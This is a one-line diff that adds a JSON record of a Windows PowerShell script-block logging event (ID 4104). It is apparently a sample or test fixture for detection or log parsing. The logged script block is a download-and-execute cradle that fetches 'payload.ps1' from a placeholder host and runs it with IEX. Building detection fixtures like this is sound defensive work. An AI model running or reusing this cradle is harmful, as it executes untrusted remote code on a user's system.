@@ -1,0 +1,1 @@
+{"win":{"system":{"eventID":"4104","channel":"Microsoft-Windows-PowerShell/Operational"},"eventdata":{"scriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')","path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
